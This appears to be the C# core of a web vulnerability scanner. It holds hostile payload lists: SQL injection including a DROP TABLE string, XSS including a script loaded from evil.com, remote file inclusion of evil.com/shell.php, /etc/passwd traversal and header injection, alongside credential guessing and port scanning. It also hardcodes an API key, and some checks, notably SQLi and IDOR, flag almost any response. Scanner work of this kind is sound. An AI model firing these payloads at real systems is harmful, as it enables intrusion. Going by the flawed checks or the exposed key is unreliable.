using HtmlAgilityPack;
using ScanGuard.BLL.Interfaces;
using ScanGuard.Models;
using RestSharp;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace ScanGuard.BLL.Utilities
{
    public class VulnerabilityAnalyzer : IVulnerabilityAnalyzer
    {
        private readonly HttpClient _httpClient;
        private readonly RestClient _restClient;
        private readonly string _virusTotalApiKey = "d385569c8812fd914740dd26544e1d01ca87efc433ac7c44e4dfc0ff0689cb97"; // Замените на ваш ключ
        public VulnerabilityAnalyzer(HttpClient httpClient, RestClient restClient)
        {
            _httpClient = httpClient;
            var options = new RestClientOptions("https://www.virustotal.com/api/v3/")
            {
                ThrowOnAnyError = true
            };
            _restClient = new RestClient(options) ?? throw new InvalidOperationException("Failed to initialize RestClient");
        }


        public async Task<List<string>> FindLoginPages(string baseUrl)
        {
            var loginPages = new HashSet<string>();
            try
            {
                var response = await _httpClient.GetStringAsync(baseUrl);
                var doc = new HtmlDocument();
                doc.LoadHtml(response);

                // Find Login Links
                var links = doc.DocumentNode.SelectNodes("//a[contains(translate(@href, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'login')]");
                if (links != null)
                {
                    foreach (var link in links)
                    {
                        var href = link.GetAttributeValue("href", "");
                        if (!string.IsNullOrEmpty(href))
                        {
                            var absoluteUrl = new Uri(new Uri(baseUrl), href).ToString();
                            loginPages.Add(absoluteUrl);
                        }
                    }
                }

                // Find Login Forms
                var forms = doc.DocumentNode.SelectNodes("//form");
                if (forms != null)
                {
                    foreach (var form in forms)
                    {
                        var passwordInput = form.SelectSingleNode(".//input[@type='password']");
                        if (passwordInput != null)
                        {
                            var action = form.GetAttributeValue("action", "");
                            if (!string.IsNullOrEmpty(action))
                            {
                                var absoluteUrl = new Uri(new Uri(baseUrl), action).ToString();
                                loginPages.Add(absoluteUrl);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error finding login pages: {0}", ex.Message);
            }
            return loginPages.ToList();
        }

        public bool CsrfTest(string method, HtmlNode form)
        {
            var csrfToken = form.SelectSingleNode(".//input[@name='csrf_token' or @name='csrf' or contains(@name, 'token')]");
            return csrfToken == null && method.ToLower() == "post";
        }

        public async Task<bool> BrokenAuthenticationTest(string loginUrl)
        {
            var weakCredentials = new List<KeyValuePair<string, string>>
            {
                new("admin", "admin"),
                new("admin", "password"),
                new("root", "toor"),
                new("user", "user"),
                new("test", "test"),
                new("admin", "123456"),
                new("administrator", "admin"),
                new("guest", "guest")
            };

            foreach (var creds in weakCredentials)
            {
                var loginData = new Dictionary<string, string>
                {
                    { "username", creds.Key },
                    { "password", creds.Value }
                };

                var (response, statusCode) = await SendRequest("post", loginUrl, loginData);
                if (statusCode == 200 && (response.Contains("dashboard") ||
                    response.Contains("welcome") ||
                    response.Contains("logout") ||
                    response.Contains("profile")))
                    return true;
            }
            return false;
        }

        public async Task<bool> SqlInjectionTest(string baseUrl)
        {
            var payloads = new List<string>
    {
        "' OR 1=1 --",
        "\" OR \"1\"=\"1",
        "' UNION SELECT null, username, password FROM users --",
        "'; DROP TABLE users --",
        "' AND '1'='1",
        "' OR 'a'='a",
        "1' ORDER BY 1--",
        "' OR EXISTS(SELECT * FROM users WHERE '1'='1') --",
        "' OR 1=1#",
        "1; SELECT SLEEP(5)--"
    };

            var loginPages = await FindLoginPages(baseUrl);
            if (!loginPages.Any())
            {
                loginPages.Add(baseUrl);
            }

            foreach (var loginUrl in loginPages)
            {
                try
                {
                    var response = await _httpClient.GetStringAsync(loginUrl);
                    var doc = new HtmlDocument();
                    doc.LoadHtml(response);

                    var forms = doc.DocumentNode.SelectNodes("//form");
                    if (forms == null) continue;

                    foreach (var form in forms)
                    {
                        var inputs = form.SelectNodes(".//input");
                        if (inputs == null) continue;

                        var formData = new Dictionary<string, string>();
                        foreach (var input in inputs)
                        {
                            var name = input.GetAttributeValue("name", "").ToLower();
                            if (!string.IsNullOrEmpty(name))
                            {
                                // Only target username, login, email, or ID fields for SQL injection
                                if (name.Contains("user") || name.Contains("login") || name.Contains("email") || name.Contains("id"))
                                {
                                    formData[name] = "test";
                                }
                                else if (name.Contains("password")) // Keep password field normal
                                {
                                    formData[name] = "Password1234*";
                                }
                            }
                        }

                        if (formData.Count == 0) continue;

                        var method = form.GetAttributeValue("method", "get").ToLower();
                        var action = form.GetAttributeValue("action", loginUrl);
                        var absoluteAction = new Uri(new Uri(loginUrl), action).ToString();

                        foreach (var payload in payloads)
                        {
                            var testData = new Dictionary<string, string>(formData);

                            // Inject payload into all identified login fields
                            foreach (var key in testData.Keys.Where(k => !k.Contains("password")))
                            {
                                testData[key] = payload;
                            }

                            var (resp, statusCode) = await SendRequest(method, absoluteAction, testData);

                            if (statusCode == 500 || // Internal Server Error (SQL error)
                                resp.Contains("SQL syntax") ||
                                resp.Contains("database error") ||
                                resp.Contains("ORA-") ||
                                resp.Contains("MySQL") ||
                                resp.Contains("PostgreSQL") ||
                                (statusCode >= 200 && statusCode < 400 ||
                                (resp.Contains("welcome") || resp.Contains("dashboard") || resp.Contains("logout"))))
                            {
                                return true;
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"SQLi Test error for {loginUrl}: {ex.Message}");
                }
            }
            return false;
        }



        public async Task<bool> XssTest(string method, string absoluteAction, Dictionary<string, string> data)
        {
            var payloads = new List<string>
            {
                "<script>alert('xss')</script>",
                "\"><script>alert(1)</script>",
                "<svg onload=alert(1)>",
                "'><img src=x onerror=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<img src=\"javascript:alert('xss')\">",
                "<body onload=alert(1)>",
                "<input type=\"text\" value=\"\"><script>alert(1)</script>",
                "javascript:alert(1)",
                "<script src=\"http://evil.com/xss.js\"></script>",
                "<img src=x onerror=alert('xss')>",
                "<link rel=stylesheet href=\"javascript:alert(1)\">"
            };

            foreach (var payload in payloads)
            {
                var testData = new Dictionary<string, string>(data);
                foreach (var key in testData.Keys)
                    testData[key] = payload;

                var (response, _) = await SendRequest(method, absoluteAction, testData);

                if (response.Contains(payload) ||
                    response.Contains("alert(1)") ||
                    response.Contains("alert('xss')"))
                    return true;
            }
            return false;
        }

        public async Task<bool> SecurityMisconfigurationTest(string url)
        {
            var sensitivePaths = new List<string>
            {
                "/.git/",
                "/admin/",
                "/backup.zip",
                "/robots.txt",
                "/config.php",
                "/.env",
                "/wp-config.php",
                "/server-status",
                "/phpinfo.php",
                "/test/",
                "/logs/",
                "/adminer.php",
                "/.htaccess"
            };

            foreach (var path in sensitivePaths)
            {
                try
                {
                    var response = await _httpClient.GetAsync(url + path);
                    if (response.IsSuccessStatusCode)
                        return true;
                }
                catch { continue; }
            }
            return false;
        }

        public async Task<bool> UnvalidatedRedirectTest(string url)
        {
            var testUrl = url + "?redirect=http://evil.com";
            var response = await _httpClient.GetAsync(testUrl);
            return response.Headers.Location?.ToString().Contains("evil.com") ?? false;
        }

        public async Task<bool> DirectoryListingTest(string url)
        {
            try
            {
                var response = await _httpClient.GetStringAsync(url);
                return response.Contains("Index of /") ||
                       response.Contains("Directory listing") ||
                       response.Contains("[DIR]");
            }
            catch { return false; }
        }

        public async Task<bool> IdorTest(string url)
        {
            try
            {
                var testUrl = url.Contains("id=") ? url.Replace("id=1", "id=2") : $"{url}?id=2";
                var response = await _httpClient.GetStringAsync(testUrl);
                return response.Contains("User 2") ||
                       response.Contains("admin") ||
                       response.Contains("Access denied") == false;
            }
            catch { return false; }
        }

        public async Task<bool> RfiTest(string url)
        {
            var testUrl = url + "?file=http://evil.com/shell.php";
            try
            {
                var response = await _httpClient.GetStringAsync(testUrl);
                return response.Contains("shell") || response.Contains("hacked");
            }
            catch { return false; }
        }

        public async Task<bool> LfiTest(string url)
        {
            var payloads = new List<string>
            {
                "?file=../../etc/passwd",
                "?file=../windows/win.ini",
                "?file=../../../../etc/hosts"
            };

            foreach (var payload in payloads)
            {
                try
                {
                    var testUrl = url + payload;
                    var response = await _httpClient.GetStringAsync(testUrl);
                    if (response.Contains("root:x:0:0:") ||
                        response.Contains("bin/bash") ||
                        response.Contains("[extensions]"))
                        return true;
                }
                catch { continue; }
            }
            return false;
        }

        public async Task<bool> HttpResponseSplittingTest(string url)
        {
            var testUrl = url + "?header=%0D%0ASet-Cookie:%20session=evil";
            try
            {
                var response = await _httpClient.GetAsync(testUrl);
                return response.Headers.Contains("Set-Cookie") ||
                       response.Headers.ToString().Contains("session=evil");
            }
            catch { return false; }
        }

        public async Task<bool> PhishingTest(string url)
        {
            try
            {
                if (_restClient == null || string.IsNullOrEmpty(_virusTotalApiKey))
                    return false;

                var request = new RestRequest("urls", Method.Post);
                request.AddHeader("accept", "application/json");
                request.AddHeader("x-apikey", _virusTotalApiKey);
                request.AddParameter("url", url);

                var response = await _restClient.ExecuteAsync(request);
                if (!response.IsSuccessful) return false;

                var content = response.Content ?? "";
                return content.Contains("\"malicious\":") && !content.Contains("\"malicious\":0");
            }
            catch { return false; }
        }

        public async Task<Dictionary<int, (bool IsOpen, string Service, string Version)>> ScanPorts(string host)
        {
            var commonPorts = new[] { 21, 22, 23, 25, 80, 443, 3306, 5432, 8080, 8443 };
            var results = new Dictionary<int, (bool, string, string)>();

            var tasks = commonPorts.Select(async port =>
            {
                bool isOpen = await IsPortOpen(host, port);
                string service = GetServiceName(port);
                string version = isOpen ? await GetServiceVersion(host, port) : "N/A";

                lock (results)
                {
                    results[port] = (isOpen, service, version);
                }
            });

            await Task.WhenAll(tasks);
            return results;
        }


        public async Task<bool> CheckWeakPasswordPolicy(string baseUrl)
        {
            var weakPasswords = new List<string>
            {
                "123456", "password", "admin123", "qwerty", "12345678", "letmein", "welcome", "123456789"
            };

            var registrationPages = await FindRegistrationPages(baseUrl);
            if (!registrationPages.Any())
            {
                registrationPages.Add(baseUrl);
            }

            foreach (var registerUrl in registrationPages)
            {
                try
                {
                    var response = await _httpClient.GetStringAsync(registerUrl);
                    var doc = new HtmlDocument();
                    doc.LoadHtml(response);

                    var forms = doc.DocumentNode.SelectNodes("//form");
                    if (forms == null) continue;

                    foreach (var form in forms)
                    {
                        var inputs = form.SelectNodes(".//input");
                        if (inputs == null) continue;

                        var formData = new Dictionary<string, string>();

                        foreach (var input in inputs)
                        {
                            var name = input.GetAttributeValue("name", "").ToLower();
                            if (!string.IsNullOrEmpty(name))
                            {
                                if (name.Contains("password"))
                                {
                                    formData[name] = weakPasswords[0]; // Use a weak password
                                }
                                else if (name.Contains("email") || name.Contains("user") || name.Contains("login"))
                                {
                                    formData[name] = "testuser@example.com"; // Dummy username
                                }
                                else
                                {
                                    formData[name] = "test";
                                }
                            }
                        }

                        if (formData.Count == 0) continue;

                        var method = form.GetAttributeValue("method", "post").ToLower();
                        var action = form.GetAttributeValue("action", registerUrl);
                        var absoluteAction = new Uri(new Uri(registerUrl), action).ToString();

                        foreach (var weakPassword in weakPasswords)
                        {
                            formData["password"] = weakPassword;

                            var (resp, statusCode) = await SendRequest(method, absoluteAction, formData);

                            if (statusCode == 200 && (resp.Contains("success") || resp.Contains("dashboard") || resp.Contains("welcome")))
                            {
                                Console.WriteLine($"[!] Weak password '{weakPassword}' accepted at {absoluteAction}");
                                return true;
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Weak password test error for {registerUrl}: {ex.Message}");
                }
            }
            return false;
        }

        public async Task<List<string>> FindRegistrationPages(string baseUrl)
        {
            var registrationPages = new HashSet<string>();
            try
            {
                var response = await _httpClient.GetStringAsync(baseUrl);
                var doc = new HtmlDocument();
                doc.LoadHtml(response);

                var links = doc.DocumentNode.SelectNodes("//a[contains(translate(@href, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'register') or contains(@href, 'signup')]");
                if (links != null)
                {
                    foreach (var link in links)
                    {
                        var href = link.GetAttributeValue("href", "");
                        if (!string.IsNullOrEmpty(href))
                        {
                            var absoluteUrl = new Uri(new Uri(baseUrl), href).ToString();
                            registrationPages.Add(absoluteUrl);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error finding registration pages: {0}", ex.Message);
            }
            return registrationPages.ToList();
        }



        private async Task<bool> IsPortOpen(string host, int port)
        {
            try
            {
                using var client = new TcpClient();
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(2));
                await client.ConnectAsync(host, port).WaitAsync(cts.Token);
                return true;
            }
            catch { return false; }
        }


        private async Task<string> GetServiceVersion(string host, int port)
        {
            try
            {
                using var client = new TcpClient();
                await client.ConnectAsync(host, port);
                using var stream = client.GetStream();

                byte[] request = port switch
                {
                    21 => Encoding.ASCII.GetBytes("USER anonymous\r\n"), // FTP
                    25 => Encoding.ASCII.GetBytes("EHLO example.com\r\n"), // SMTP
                    80 or 443 => Encoding.ASCII.GetBytes("HEAD / HTTP/1.0\r\n\r\n"), // HTTP/HTTPS
                    _ => Encoding.ASCII.GetBytes("\n")
                };

                await stream.WriteAsync(request);
                byte[] buffer = new byte[1024];
                int bytesRead = await stream.ReadAsync(buffer);
                string response = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                if (response.Contains("Server:"))
                {
                    return response.Split(new[] { "Server:" }, StringSplitOptions.None)[1]
                        .Split('\r')[0].Trim();
                }
                return "Unknown";
            }
            catch { return "Unknown"; }
        }


        private string GetServiceName(int port)
        {
            return port switch
            {
                21 => "FTP",
                22 => "SSH",
                23 => "Telnet",
                25 => "SMTP",
                80 => "HTTP",
                443 => "HTTPS",
                3306 => "MySQL",
                5432 => "PostgreSQL",
                8080 => "HTTP-Alt",
                8443 => "HTTPS-Alt",
                _ => "Unknown"
            };
        }

        public async Task<(string response, int statusCode)> SendRequest(string method, string action, Dictionary<string, string> data)
        {
            HttpResponseMessage response;
            if (method.ToLower() == "post")
            {
                var content = new FormUrlEncodedContent(data);
                response = await _httpClient.PostAsync(action, content);
            }
            else
            {
                var query = string.Join("&", data.Select(kvp => $"{Uri.EscapeDataString(kvp.Key)}={Uri.EscapeDataString(kvp.Value)}"));
                response = await _httpClient.GetAsync($"{action}?{query}");
            }

            return (await response.Content.ReadAsStringAsync(), (int)response.StatusCode);
        }

        public bool IsHttp(Uri baseUri)
            => string.Equals(baseUri.Scheme.Trim(), "http", StringComparison.OrdinalIgnoreCase);

        public int CalculateVulnerabilityCount(Vulnerability vulnerability)
        {
            int vulnCount = 0;
            if (vulnerability.SQLi) vulnCount++;
            if (vulnerability.XSS) vulnCount++;
            if (vulnerability.CSRF) vulnCount++;
            if (vulnerability.HTTPWithoutS) vulnCount++;
            if (vulnerability.Phishing) vulnCount++;
            if (vulnerability.RFI) vulnCount++;
            if (vulnerability.LFI) vulnCount++;
            if (vulnerability.HTTPResponseSplitting) vulnCount++;
            if (vulnerability.IDOR) vulnCount++;
            if (vulnerability.SecurityMisconfiguration) vulnCount++;
            if (vulnerability.UnvalidatedRedirectAndForwards) vulnCount++;
            if (vulnerability.DirectoryListing) vulnCount++;
            if (vulnerability.BrokenAuthentification) vulnCount++;
            if (vulnerability.CheckWeakPasswordPolicy) vulnCount++;
            return vulnCount;
        }
    }
}
